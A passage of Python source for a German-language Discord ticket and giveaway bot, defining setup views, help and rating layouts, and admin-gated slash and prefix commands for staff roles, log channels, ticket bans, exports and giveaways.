            await deny_v2(interaction, action="Setup", reason="Nur auf einem Server.", fix="Im Server.")
            return
        if not interaction.user.guild_permissions.administrator:
            await deny_v2(interaction, action="Setup", reason="Nur Administratoren.", fix="Admin fragen.")
            return
        await interaction.response.send_message(view=PanelLayout(interaction.guild))


class SetupPostGwPanelButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Giveaway-Panel",
            style=discord.ButtonStyle.secondary,
            emoji="🎉",
            custom_id="setup_post_gw_panel",
        )

    async def callback(self, interaction: discord.Interaction):
        if not interaction.user.guild_permissions.administrator:
            await deny_v2(interaction, action="Setup", reason="Nur Administratoren.", fix="Admin fragen.")
            return
        await interaction.response.send_message(view=GiveawayPanelLayout())


class SetupRefreshButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Status aktualisieren",
            style=discord.ButtonStyle.success,
            emoji="🔄",
            custom_id="setup_refresh",
        )

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        if guild is None:
            await deny_v2(interaction, action="Setup", reason="Nur auf einem Server.", fix="Im Server.")
            return
        await interaction.response.edit_message(view=SetupLayout(guild))


class SetupLayout(ui.LayoutView):
    """Interaktives Setup: Staff, Log, Bewertungen, Blacklist, Panels."""

    def __init__(self, guild: discord.Guild):
        super().__init__(timeout=300)
        status = setup_status_text(guild)
        container = ui.Container(accent_color=discord.Color.blurple())
        container.add_item(
            ui.TextDisplay(
                f"## ⚙️ Setup-Assistent\n"
                f"Konfiguriere den Bot für **{guild.name}** — alles per Klick.\n\n"
                f"**Aktueller Status**\n{status}\n\n"
                f"**So geht’s**\n"
                f"> 1️⃣ Staff-Rollen wählen\n"
                f"> 2️⃣ Log-Kanal wählen (Audit + Transkripte)\n"
                f"> 3️⃣ Bewertungs-Kanal wählen\n"
                f"> 4️⃣ Optional Blacklist-Rolle\n"
                f"> 5️⃣ Panel posten\n\n"
                f"-# {BRAND_FOOTER}"
            )
        )
        container.add_item(ui.Separator())

        r1 = ui.ActionRow()
        r1.add_item(SetupRoleSelect())
        container.add_item(r1)

        r2 = ui.ActionRow()
        r2.add_item(
            SetupChannelSelect("log", "Log-Kanal (Audit/Transkripte)…", "setup_log_channel")
        )
        container.add_item(r2)

        r3 = ui.ActionRow()
        r3.add_item(
            SetupChannelSelect("rating", "Bewertungs-Kanal…", "setup_rating_channel")
        )
        container.add_item(r3)

        r4 = ui.ActionRow()
        r4.add_item(SetupBlacklistRoleSelect())
        container.add_item(r4)

        r5 = ui.ActionRow()
        r5.add_item(SetupPostPanelButton())
        r5.add_item(SetupPostGwPanelButton())
        r5.add_item(SetupRefreshButton())
        container.add_item(r5)

        self.add_item(container)



def _help_body() -> str:
    return (
        f"Hey! Ich bin der **Ticket- & Community-Bot**.\n"
        f"Powered by **{BRAND_NAME}**.\n\n"
        "**Was ich kann**\n"
        "> 🎟️ Tickets (Support · Beschwerde · Giveaway Claim · Bewerbung)\n"
        "> ✋ Claim / 🔓 Freigeben / 🔒 Close / 🔄 Weiter / 🤡 Spaß\n"
        "> 📝 Bewerbungen mit Formular · Annehmen/Ablehnen\n"
        "> 🎉 Giveaways inkl. Panel, Join & Reroll\n"
        "> ⭐ Bewertungen, Scores, Transkripte, Audit-Log\n"
        "> 📊 Live-Status-Leiste in jedem Ticket\n\n"
        "**Slash-Befehle**\n"
        "> `/help` — dieses Menü\n"
        "> `/setup` — interaktives Setup (Staff, Log, …)\n"
        "> `/panel` — Ticket-Panel\n"
        "> `/tickets` — offene Tickets-Übersicht\n"
        "> `/botstatus` — Ping, Queue, Giveaways, Fehler\n"
        "> `/export` — Config-Backup als JSON\n"
        "> `/staff` — Staff-Rollen (rolle1…rolle5)\n"
        "> `/bewertungen` · `/logchannel` · `/blacklistrole`\n"
        "> `/ticketban` · `/ticketstats` · `/ratings` · `/score`\n"
        "> `/giveaway` · `/giveawaypanel`\n"
        "> `/sync` — Slash neu laden (Admin)\n\n"
        "**Prefix** geht weiter: `!panel`, `!help`, `!giveaway`, …\n\n"
        "**Buttons greifen nicht?**\n"
        "> Du bekommst immer eine **V2-Meldung** mit **Warum?** + **So geht’s weiter**.\n\n"
        f"-# {BRAND_FOOTER}"
    )


def help_layout() -> InfoLayout:
    return InfoLayout(
        title="📖 Help-Menü",
        body=_help_body(),
        accent=discord.Color.teal(),
        footer=None,  # already branded inside body + InfoLayout
    )


def ratings_layout(guild: discord.Guild) -> InfoLayout:
    gid = guild.id
    items = _ratings.get(gid) or []
    avg = guild_avg_stars(gid)
    top = top_supporters(gid, limit=5)
    recent = recent_ratings(gid, limit=10)

    if avg is None and not top and not recent:
        return InfoLayout(
            title="⭐ Bewertungs-Statistik",
            body=(
                "Noch **keine** Bewertungen auf diesem Server.\n\n"
                "> Sobald Tickets geschlossen & bewertet werden, erscheint hier alles.\n"
                "> Tipp: `/bewertungen` im Ziel-Kanal setzen."
            ),
            accent=discord.Color.gold(),
            footer=now_str(),
        )

    avg_line = f"**{avg:.2f} / 5** {stars_bar(round(avg))}" if avg is not None else "*keine*"
    top_lines: list[str] = []
    for i, (uid, data) in enumerate(top, 1):
        rc = int(data.get("rating_count") or 0)
        rsum = int(data.get("rating_sum") or 0)
        a = (rsum / rc) if rc else 0.0
        top_lines.append(
            f"> `{i}.` <@{uid}> — Score **{data.get('score', 0)}** · "
            f"Ø `{a:.2f}⭐` ({rc}) · Closed `{data.get('closed', 0)}`"
        )
    if not top_lines:
        top_lines = ["> *noch keine Supporter-Scores*"]

    rev_lines: list[str] = []
    for r in recent:
        st = int(r.get("stars", 0))
        fb = str(r.get("feedback") or "").replace("\n", " ")
        if len(fb) > 80:
            fb = fb[:77] + "…"
        who = f"<@{r.get('user_id')}>" if r.get("user_id") else "?"
        claim = f"<@{r['claimer_id']}>" if r.get("claimer_id") else "—"
        rev_lines.append(f"> {stars_bar(st)} {who} → {claim}: *{fb}*")
    if not rev_lines:
        rev_lines = ["> *—*"]

    return InfoLayout(
        title="⭐ Bewertungs-Statistik",
        body=(
            f"**Durchschnitt**\n> {avg_line}\n"
            f"> Aus **{len(items)}** Bewertung(en)\n\n"
            f"**🏆 Supporter-Score (Top 5)**\n"
            + "\n".join(top_lines)
            + "\n\n**📝 Letzte 10 Reviews**\n"
            + "\n".join(rev_lines)
            + f"\n\n-# Score = ØSterne×20 + Closed×2 + Anzahl×3 · {now_str()}"
        ),
        accent=discord.Color.gold(),
    )


def score_layout(guild: discord.Guild, target: discord.abc.User) -> InfoLayout:
    data = (_supporter_stats.get(guild.id) or {}).get(str(target.id))
    if not data:
        return InfoLayout(
            title="🏅 Supporter-Score",
            body=(
                f"> {target.mention} hat noch **keinen** Score.\n\n"
                "**Warum?**\n"
                "> Score entsteht durch **geschlossene** Tickets und **Sterne-Bewertungen**."
            ),
            accent=discord.Color.dark_grey(),
            footer=now_str(),
        )
    rc = int(data.get("rating_count") or 0)
    rsum = int(data.get("rating_sum") or 0)
    avg = (rsum / rc) if rc else 0.0
    return InfoLayout(
        title="🏅 Supporter-Score",
        body=(
            f"**{target.mention}**\n\n"
            f"> **Score:** `{data.get('score', 0)}`\n"
            f"> **Ø Sterne:** `{avg:.2f}` {stars_bar(round(avg))}\n"
            f"> **Bewertungen:** `{rc}`\n"
            f"> **Tickets geschlossen:** `{data.get('closed', 0)}`\n\n"
            f"-# Formel: Ø×20 + Closed×2 + Reviews×3 · {now_str()}"
        ),
        accent=discord.Color.green(),
    )


async def stats_layout(guild: discord.Guild) -> InfoLayout:
    guild_open = sum(1 for ch_id in _ticket_owners if guild.get_channel(ch_id))
    staff = await get_staff_roles(guild)
    rating = get_rating_channel_id(guild.id)
    log_ch = get_log_channel_id(guild.id)
    avg_s = guild_avg_stars(guild.id)
    today = guild_today_created(guild.id)
    avg_r = guild_avg_response_minutes(guild.id)
    avg_s_txt = f"{avg_s:.2f}" if avg_s is not None else "—"
    avg_r_txt = f"{avg_r:.1f} Min" if avg_r is not None else "—"
    rating_txt = f"<#{rating}>" if rating else "—"
    log_txt = f"<#{log_ch}>" if log_ch else "—"
    return InfoLayout(
        title="📊 Ticket-Statistiken",
        body=(
            f"**Global**\n"
            f"> Erstellt: `{_stats.get('total_created', 0)}` · Geschlossen: `{_stats.get('total_closed', 0)}`\n"
            f"> Offen (Bot): `{len(_ticket_owners)}`\n\n"
            f"**Server**\n"
            f"> Offen: `{guild_open}` · Heute: `{today}`\n"
            f"> Ø Sterne: `{avg_s_txt}`\n"
            f"> Ø 1. Antwort: `{avg_r_txt}`\n"
            f"> Staff: {staff_role_mentions(staff)}\n"
            f"> Bewertungen: {rating_txt} · Log: {log_txt}\n\n"
            f"-# {now_str()}"
        ),
        accent=discord.Color.blurple(),
    )


async def do_staff_set(guild: discord.Guild, roles: list[discord.Role]) -> InfoLayout:
    if not roles:
        current = await get_staff_roles(guild)
        lines = "\n".join(
            f"> {i}. {r.mention} — **{r.name}** (`{r.id}`)" for i, r in enumerate(current, 1)
        ) or "> *keine*"
        return InfoLayout(
            title="🛡️ Staff-Rollen",
            body=(
                f"**Aktiv** ({len(current)})\n{lines}\n\n"
                "**Setzen**\n"
                "> `/staff rolle1:@Supporter rolle2:@Moderator`\n"
                "> oder `!staff @Supporter @Moderator`\n\n"
                "**Rechte dieser Rollen**\n"
                "> Claimen · Freigeben · Schließen · Weiterleiten · Spaß"
            ),
            accent=discord.Color.purple(),
            footer=now_str(),
        )

    clean: list[discord.Role] = []
    skipped: list[str] = []
    seen: set[int] = set()
    for role in roles:
        if role.is_default():
            skipped.append("`@everyone`")
            continue
        if role.managed:
            skipped.append(f"**{role.name}** (Bot/Integration)")
            continue
        if role.id in seen:
            continue
        seen.add(role.id)
        clean.append(role)

    if not clean:
        return InfoLayout(
            title="❌ Keine gültigen Rollen",
            body=(
                "**Warum?**\n"
                "> `@everyone` und verwaltete Bot-Rollen sind nicht erlaubt.\n\n"
                "**So geht’s weiter**\n"
                "> Echte Team-Rollen pingen, z. B. `/staff roles:@Supporter @Mod`"
            ),
            accent=discord.Color.red(),
        )

    set_staff_role_ids(guild.id, [r.id for r in clean])
    lines = "\n".join(f"> {i}. {r.mention} — **{r.name}**" for i, r in enumerate(clean, 1))
    extra = f"\n\n**Übersprungen:** {' · '.join(skipped)}" if skipped else ""
    return InfoLayout(
        title="✅ Staff-Rollen gespeichert",
        body=(
            f"**{len(clean)}** Rolle(n) sind ab jetzt Staff:\n{lines}{extra}\n\n"
            "Gilt für **neue** Tickets (sehen, claimen, schließen, weiterleiten).\n\n"
            f"-# {now_str()}"
        ),
        accent=discord.Color.green(),
    )


# ---------- Slash Commands ----------

@bot.tree.command(name="panel", description="Ticket-Panel mit Live-Server-Stats posten")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_panel(interaction: discord.Interaction):
    if interaction.guild is None:
        await deny_v2(
            interaction,
            action="/panel",
            reason="Nur auf einem Server nutzbar.",
            fix="Im gewünschten Support-Kanal ausführen.",
        )
        return
    await interaction.response.send_message(view=PanelLayout(interaction.guild))


@bot.tree.command(name="bewertungen", description="Diesen Kanal als Bewertungs-Log setzen")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_bewertungen(interaction: discord.Interaction):
    if interaction.guild is None or not isinstance(interaction.channel, discord.TextChannel):
        await deny_v2(
            interaction,
            action="/bewertungen",
            reason="Nur in einem **Textkanal** auf dem Server.",
            fix="In den gewünschten Log-Kanal gehen und erneut ausführen.",
        )
        return
    set_rating_channel(interaction.guild.id, interaction.channel.id)
    await ok_v2(
        interaction,
        title="⭐ Bewertungs-Kanal gesetzt",
        body=(
            f"> 📢 {interaction.channel.mention}\n\n"
            "**Ablauf**\n"
            "> 1. Ticket schließen\n"
            "> 2. User bekommt DM mit Sternen + Transkript\n"
            "> 3. Ergebnis erscheint **hier**"
        ),
        accent=discord.Color.gold(),
    )


@bot.tree.command(name="logchannel", description="Diesen Kanal als Audit- & Transkript-Log setzen")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_logchannel(interaction: discord.Interaction):
    if interaction.guild is None or not isinstance(interaction.channel, discord.TextChannel):
        await deny_v2(
            interaction,
            action="/logchannel",
            reason="Nur in einem **Textkanal** auf dem Server.",
            fix="In den Log-Kanal wechseln und `/logchannel` erneut nutzen.",
        )
        return
    set_log_channel(interaction.guild.id, interaction.channel.id)
    await ok_v2(
        interaction,
        title="📜 Log- / Audit-Kanal gesetzt",
        body=(
            f"> 📁 {interaction.channel.mention}\n\n"
            "Hier landen als **Components V2**:\n"
            "> • Transkripte\n"
            "> • Claim · Freigeben · Forward · Close · Timeout · Create"
        ),
        accent=discord.Color.blue(),
    )


@bot.tree.command(name="staff", description="Staff-Rollen anzeigen oder setzen")
@app_commands.describe(
    rolle1="Staff-Rolle 1 (leer lassen = nur anzeigen)",
    rolle2="Staff-Rolle 2 (optional)",
    rolle3="Staff-Rolle 3 (optional)",
    rolle4="Staff-Rolle 4 (optional)",
    rolle5="Staff-Rolle 5 (optional)",
)
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_staff(
    interaction: discord.Interaction,
    rolle1: discord.Role | None = None,
    rolle2: discord.Role | None = None,
    rolle3: discord.Role | None = None,
    rolle4: discord.Role | None = None,
    rolle5: discord.Role | None = None,
):
    if interaction.guild is None:
        await deny_v2(interaction, action="/staff", reason="Nur auf einem Server.", fix="Auf dem Server ausführen.")
        return

    parsed = [r for r in (rolle1, rolle2, rolle3, rolle4, rolle5) if r is not None]
    view = await do_staff_set(interaction.guild, parsed)
    await interaction.response.send_message(view=view)


@bot.tree.command(name="ticketban", description="User für Tickets sperren oder entsperren")
@app_commands.describe(user="Der User")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_ticketban(interaction: discord.Interaction, user: discord.User):
    if user.bot:
        await deny_v2(
            interaction,
            action="/ticketban",
            reason="Bots können nicht auf die Ticket-Blacklist.",
            fix="Wähle einen echten User.",
            accent=discord.Color.orange(),
        )
        return
    if interaction.user.id == user.id:
        await deny_v2(
            interaction,
            action="/ticketban",
            reason="Du kannst dich **nicht selbst** bannen.",
            fix="Anderen User wählen.",
            accent=discord.Color.orange(),
        )
        return
    banned = toggle_blacklist(user.id)
    await ok_v2(
        interaction,
        title="🚫 Gesperrt" if banned else "✅ Entsperrt",
        body=(
            f"**{user.mention}** (`{user.id}`) ist für Tickets "
            f"**{'gesperrt' if banned else 'wieder freigeschaltet'}**.\n\n"
            f"> Bei Sperre erscheint beim Panel eine V2-Meldung mit Grund."
        ),
        accent=discord.Color.red() if banned else discord.Color.green(),
    )


@bot.tree.command(name="ticketstats", description="Ticket-Statistiken anzeigen")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_ticketstats(interaction: discord.Interaction):
    if interaction.guild is None:
        await deny_v2(interaction, action="/ticketstats", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    await interaction.response.send_message(view=await stats_layout(interaction.guild))


@bot.tree.command(name="ratings", description="Ø-Sterne, Top-Supporter und letzte Reviews")
@app_commands.guild_only()
async def slash_ratings(interaction: discord.Interaction):
    if interaction.guild is None:
        await deny_v2(interaction, action="/ratings", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    await interaction.response.send_message(view=ratings_layout(interaction.guild))


@bot.tree.command(name="score", description="Supporter-Score anzeigen")
@app_commands.describe(member="Optional: anderer Supporter")
@app_commands.guild_only()
async def slash_score(interaction: discord.Interaction, member: discord.Member | None = None):
    if interaction.guild is None:
        await deny_v2(interaction, action="/score", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    target = member or interaction.user
    await interaction.response.send_message(view=score_layout(interaction.guild, target))


@bot.tree.command(name="help", description="Help-Menü: was der Bot kann + alle Befehle")
async def slash_help(interaction: discord.Interaction):
    await interaction.response.send_message(view=help_layout(), ephemeral=True)


@bot.tree.command(name="tickethelp", description="Hilfe zu allen Ticket-Befehlen und Buttons")
async def slash_tickethelp(interaction: discord.Interaction):
    await interaction.response.send_message(view=help_layout(), ephemeral=True)



@bot.tree.command(name="giveaway", description="Neues Giveaway erstellen")
@app_commands.describe(
    prize="Was wird verlost?",
    winners="Anzahl Gewinner",
    duration="Dauer z.B. 30s, 10m, 2h, 1d",
    description="Optionale Beschreibung",
)
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_giveaway(
    interaction: discord.Interaction,
    prize: str,
    winners: app_commands.Range[int, 1, 50],
    duration: str,
    description: str = "",
):
    if interaction.guild is None or not isinstance(interaction.channel, discord.TextChannel):
        await deny_v2(
            interaction,
            action="/giveaway",
            reason="Nur in einem Textkanal auf dem Server.",
            fix="Im Ankündigungs-Kanal ausführen.",
        )
        return
    seconds = parse_duration(duration)
    if not seconds or seconds < 5:
        await deny_v2(
            interaction,
            action="/giveaway",
            reason="Ungültige Dauer (Format: 30s, 10m, 2h, 1d, min. 5s).",
            fix="Beispiel: duration:2h",
            accent=discord.Color.orange(),
        )
        return

    prize = prize.strip()[:200]
    desc = (description or "").strip()
    if desc.lower() in {"keine", "nein", "none", "-"}:
        desc = ""

    gw_id = f"{interaction.guild.id}_{int(datetime.datetime.now(datetime.timezone.utc).timestamp())}"
    end_time = datetime.datetime.now(datetime.timezone.utc).timestamp() + seconds
    _giveaways[gw_id] = {
        "prize": prize,
        "winners": int(winners),
        "end_time": end_time,
        "description": desc,
        "participants": set(),
        "ended": False,
        "winner_text": "",
        "channel_id": interaction.channel.id,
        "message_id": None,
    }
    schedule_save()
    bot.add_view(GiveawayTicketLayout(gw_id, bot.user))
    start_giveaway_runner(gw_id)

    await interaction.response.send_message(view=GiveawayTicketLayout(gw_id, interaction.user))
    await audit_log(
        interaction.guild,
        title="🎉 Audit · Giveaway erstellt",
        body=(
            f"> **Preis:** {prize}\n"
            f"> **Gewinner:** {winners}\n"
            f"> **Dauer:** {duration}\n"
            f"> **Kanal:** {interaction.channel.mention}\n"
            f"> **Von:** {interaction.user.mention}"
        ),
        accent=discord.Color.gold(),
    )


@bot.tree.command(name="giveawaypanel", description="Giveaway-Panel mit Dropdown posten")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_giveawaypanel(interaction: discord.Interaction):
    await interaction.response.send_message(view=GiveawayPanelLayout())


@bot.tree.command(name="blacklistrole", description="Rolle die als Ticket-Blacklist gilt")
@app_commands.describe(role="Die Blacklist-Rolle")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_blacklistrole(interaction: discord.Interaction, role: discord.Role):
    if interaction.guild is None:
        await deny_v2(interaction, action="/blacklistrole", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    if role.is_default() or role.managed:
        await deny_v2(
            interaction,
            action="/blacklistrole",
            reason="@everyone oder Bot-Rollen sind nicht erlaubt.",
            fix="Eigene Server-Rolle wählen.",
        )
        return
    set_blacklist_role(interaction.guild.id, role.id)
    await ok_v2(
        interaction,
        title="🚫 Blacklist-Rolle gesetzt",
        body=(
            f"> Rolle: {role.mention}\n\n"
            "User mit dieser Rolle können keine Tickets/Bewerbungen öffnen.\n"
            "Bei abgelehnter Bewerbung wird die Rolle automatisch vergeben."
        ),
        accent=discord.Color.dark_red(),
    )



@bot.tree.command(name="tickets", description="Offene Tickets-Übersicht fürs Team")
@app_commands.guild_only()
async def slash_tickets(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await deny_v2(interaction, action="/tickets", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    member = guild.get_member(interaction.user.id) or interaction.user
    if not (isinstance(member, discord.Member) and (is_staff(member, guild) or member.guild_permissions.administrator)):
        await deny_v2(
            interaction,
            action="/tickets",
            reason="Nur **Staff** oder Admins sehen die Ticket-Übersicht.",
            fix="Staff-Rolle benötigt (`/setup` / `/staff`).",
        )
        return
    await interaction.response.send_message(view=tickets_layout(guild), ephemeral=True)


@bot.tree.command(name="botstatus", description="Bot-Health: Ping, offene Tickets, Giveaways, Fehler")
@app_commands.guild_only()
async def slash_botstatus(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await deny_v2(interaction, action="/botstatus", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    member = guild.get_member(interaction.user.id)
    if not (member and (is_staff(member, guild) or member.guild_permissions.administrator)):
        await deny_v2(
            interaction,
            action="/botstatus",
            reason="Nur **Staff**/Admins.",
            fix="Staff-Rolle benötigt.",
        )
        return
    await interaction.response.send_message(view=botstatus_layout(guild), ephemeral=True)


@bot.tree.command(name="export", description="Config-Backup als JSON (Staff, Kanäle, Stats)")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_export(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await deny_v2(interaction, action="/export", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    await interaction.response.defer(ephemeral=True)
    try:
        payload = build_export_payload(guild)
        raw = json.dumps(payload, indent=2, ensure_ascii=False).encode("utf-8")
        filename = f"ticketbot-export-{guild.id}-{int(utcnow().timestamp())}.json"
        file = discord.File(io.BytesIO(raw), filename=filename)
        await interaction.followup.send(
            view=InfoLayout(
                title="📦 Export bereit",
                body=(
                    f"Backup für **{guild.name}** wurde erzeugt.\n\n"
                    f"> Enthält: Staff-Rollen, Log/Bewertungs-Kanäle, Stats,\n"
                    f"> offene Tickets, Giveaways, Top-Supporter\n"
                    f"> **Kein Bot-Token** im Export.\n\n"
                    f"-# Datei nur intern teilen"
                ),
                accent=discord.Color.dark_teal(),
            ),
            file=file,
            ephemeral=True,
        )
    except Exception as e:
        push_error("export", str(e))
        await interaction.followup.send(
            view=DenyLayout(
                action="/export",
                reason="Export fehlgeschlagen.",
                fix="Später erneut versuchen.",
                details=f"> `{type(e).__name__}: {e}`",
            ),
            ephemeral=True,
        )


@bot.tree.command(name="setup", description="Interaktives Setup: Staff, Log, Bewertungen, Blacklist, Panels")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def slash_setup(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await deny_v2(interaction, action="/setup", reason="Nur auf einem Server.", fix="Im Server ausführen.")
        return
    await interaction.response.send_message(view=SetupLayout(guild), ephemeral=True)


@bot.tree.command(name="sync", description="Slash-Commands neu bei Discord registrieren")
@app_commands.default_permissions(administrator=True)
async def slash_sync(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        if interaction.guild is not None:
            bot.tree.copy_global_to(guild=interaction.guild)
            synced = await bot.tree.sync(guild=interaction.guild)
            scope = f"diesen Server (**{len(synced)}** Commands)"
        else:
            synced = await bot.tree.sync()
            scope = f"global (**{len(synced)}** Commands)"
        await interaction.followup.send(
            view=InfoLayout(
                title="✅ Slash-Commands synchronisiert",
                body=(
                    f"> Sync für {scope}\n\n"
                    "**Tipps**\n"
                    "> • Server-Sync ist **sofort** sichtbar\n"
                    "> • Global kann bis zu **1 Std.** dauern\n"
                    "> • Bei Problemen: Bot neu einladen mit `applications.commands`"
                ),
                accent=discord.Color.green(),
                footer=now_str(),
            ),
            ephemeral=True,
        )
    except discord.HTTPException as e:
        await interaction.followup.send(
            view=DenyLayout(
                action="/sync",
                reason="Discord hat den Sync abgelehnt.",
                fix="Später erneut versuchen oder Bot-Invite mit applications.commands prüfen.",
                details=f"> `{type(e).__name__}: {e}`",
            ),
            ephemeral=True,
        )


# ---------- Prefix-Aliase (gleiche Funktionen) ----------

@bot.command(name="panel")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.channel)
async def panel_cmd(ctx: commands.Context):
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    await ctx_v2(ctx, PanelLayout(ctx.guild))


@bot.command(name="bewertungen")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 3, commands.BucketType.guild)
async def bewertungen_cmd(ctx: commands.Context):
    assert ctx.guild and ctx.channel
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    set_rating_channel(ctx.guild.id, ctx.channel.id)
    await ctx_v2(
        ctx,
        InfoLayout(
            title="⭐ Bewertungs-Kanal gesetzt",
            body=(
                f"> 📢 {ctx.channel.mention}\n\n"
                "> Tipp: nutze künftig `/bewertungen`"
            ),
            accent=discord.Color.gold(),
            footer=now_str(),
        ),
    )


@bot.command(name="logchannel")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 3, commands.BucketType.guild)
async def logchannel_cmd(ctx: commands.Context):
    assert ctx.guild and ctx.channel
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    set_log_channel(ctx.guild.id, ctx.channel.id)
    await ctx_v2(
        ctx,
        InfoLayout(
            title="📜 Log- / Audit-Kanal gesetzt",
            body=f"> 📁 {ctx.channel.mention}\n> Tipp: `/logchannel`",
            accent=discord.Color.blue(),
            footer=now_str(),
        ),
    )


@bot.command(name="staff")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 3, commands.BucketType.guild)
async def staff_cmd(ctx: commands.Context, *roles: discord.Role):
    assert ctx.guild
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    await ctx_v2(ctx, await do_staff_set(ctx.guild, list(roles)))


@bot.command(name="ticketban")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(2, 5, commands.BucketType.user)
async def ticketban_cmd(ctx: commands.Context, user: discord.User):
    if user.bot:
        await ctx_v2(
            ctx,
            DenyLayout(
                action="ticketban",
                reason="Bots können nicht auf die Blacklist.",
                fix="Echten User wählen.",
                accent=discord.Color.orange(),
            ),
            delete_after=10,
        )
        return
    banned = toggle_blacklist(user.id)
    await ctx_v2(
        ctx,
        InfoLayout(
            title="🚫 Gesperrt" if banned else "✅ Entsperrt",
            body=f"**{user.mention}** (`{user.id}`) — Tickets **{'gesperrt' if banned else 'entsperrt'}**.",
            accent=discord.Color.red() if banned else discord.Color.green(),
            footer=now_str(),
        ),
    )


@bot.command(name="ticketstats")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.channel)
async def ticketstats_cmd(ctx: commands.Context):
    assert ctx.guild
    await ctx_v2(ctx, await stats_layout(ctx.guild))


@bot.command(name="ratings")
@commands.guild_only()
@commands.cooldown(1, 8, commands.BucketType.channel)
async def ratings_cmd(ctx: commands.Context):
    assert ctx.guild
    await ctx_v2(ctx, ratings_layout(ctx.guild))


@bot.command(name="score")
@commands.guild_only()
@commands.cooldown(1, 5, commands.BucketType.user)
async def score_cmd(ctx: commands.Context, member: discord.Member | None = None):
    assert ctx.guild
    await ctx_v2(ctx, score_layout(ctx.guild, member or ctx.author))


@bot.command(name="help")
@commands.cooldown(1, 5, commands.BucketType.channel)
async def help_cmd(ctx: commands.Context):
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    await ctx_v2(ctx, help_layout())


@bot.command(name="tickethelp")
@commands.cooldown(1, 5, commands.BucketType.channel)
async def tickethelp_cmd(ctx: commands.Context):
    await ctx_v2(ctx, help_layout())



@bot.command(name="giveaway")
@commands.has_permissions(administrator=True)
@commands.guild_only()
@commands.cooldown(1, 10, commands.BucketType.guild)
async def giveaway_cmd(ctx: commands.Context):
    """Interaktive Giveaway-Erstellung wie in NEW.txt."""
    assert ctx.guild and isinstance(ctx.channel, discord.TextChannel)

    def check(m: discord.Message) -> bool:
        return m.author.id == ctx.author.id and m.channel.id == ctx.channel.id

    try:
        await ctx_v2(ctx, InfoLayout(title="Giveaway Erstellung (1/4)", body="Was wird verlost? (z. B. `1x VIP Rang`)", accent=discord.Color.gold()))
        msg_prize = await bot.wait_for("message", check=check, timeout=60.0)
        prize = msg_prize.content.strip()[:200]

        await ctx_v2(ctx, InfoLayout(title="Giveaway Erstellung (2/4)", body="Wie viele Gewinner soll es geben?", accent=discord.Color.gold()))
        msg_winners = await bot.wait_for("message", check=check, timeout=60.0)
        if not msg_winners.content.strip().isdigit() or int(msg_winners.content.strip()) < 1:
            await ctx_v2(ctx, DenyLayout(action="giveaway", reason="Ungültige Anzahl an Gewinnern.", fix="Zahl ab 1 eingeben."))
            return
        winners_count = int(msg_winners.content.strip())

        await ctx_v2(ctx, InfoLayout(title="Giveaway Erstellung (3/4)", body="Dauer? (`30s`, `10m`, `2h`, `1d`)", accent=discord.Color.gold()))
        msg_time = await bot.wait_for("message", check=check, timeout=60.0)
        seconds = parse_duration(msg_time.content.strip())
        if not seconds or seconds < 5:
            await ctx_v2(ctx, DenyLayout(action="giveaway", reason="Ungültige Zeit (min. 5s).", fix="Format: 30s / 10m / 2h / 1d"))
            return

        await ctx_v2(ctx, InfoLayout(title="Giveaway Erstellung (4/4)", body="Zusatzbeschreibung (oder `keine`):", accent=discord.Color.gold()))
        msg_desc = await bot.wait_for("message", check=check, timeout=60.0)
        description = ""
        if msg_desc.content.strip().lower() not in {"keine", "nein", "none", "-"}:
            description = msg_desc.content.strip()

        gw_id = f"{ctx.guild.id}_{int(datetime.datetime.now(datetime.timezone.utc).timestamp())}"
        end_time = datetime.datetime.now(datetime.timezone.utc).timestamp() + seconds
        _giveaways[gw_id] = {
            "prize": prize,
            "winners": winners_count,
            "end_time": end_time,
            "description": description,
            "participants": set(),
            "ended": False,
            "winner_text": "",
            "channel_id": ctx.channel.id,
            "message_id": None,
        }
        schedule_save()
        bot.add_view(GiveawayTicketLayout(gw_id, bot.user))
        start_giveaway_runner(gw_id)
        await ctx_v2(ctx, GiveawayTicketLayout(gw_id, ctx.author))
        await ctx_v2(ctx, InfoLayout(title="✅ Giveaway erstellt!", body=f"> **{prize}** läuft jetzt.\n> Optional: `!giveawaypanel`", accent=discord.Color.green(), footer=now_str()))
    except asyncio.TimeoutError:
